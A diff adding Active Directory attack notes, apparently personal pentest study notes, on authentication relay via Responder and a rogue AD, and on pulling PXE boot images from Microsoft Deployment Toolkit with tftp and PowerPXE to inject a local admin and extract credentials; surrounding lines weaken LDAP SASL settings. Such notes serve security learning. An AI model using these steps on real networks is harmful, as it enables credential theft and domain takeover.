@@ -161,6 +161,30 @@
 replace: olcSaslSecProps
 olcSaslSecProps: noanonymous,minssf=0,passcred
 
+## Authentication Relays
+- SMB = Server Message Block
+  - Communication Client-Server on Microsoft AD
+
+- Make client communicate to Rogue AD
+  - send poisoned response
+  - race condition
+  - Responder ==> intercept connections (similar to wifi)
+
+## MDT
+- Microsoft Deployment Toolkit
+  - deploy images
+  - MSCCM = Microsoft System Center COnfiguration Manager = updates
+- with PXE
+  - *.bcd = info for PXE boot
+  - Download those files
+    - tftp -i IP GET "\Tmp\file.bcs" name
+    - powershell -executionpolicy bypass
+    - Import-Module .\PowerPXE.ps1
+      - Get-WimFile -bcdFile file.conf ==> PXE boot image
+    - Extract image
+      - inject local admin
+      - Exfiltrate credentials = Get-FindCredentials -WimFile FILE
+
 ## COMMANDS
 - systeminfo ==> command
   - Os config + Domain
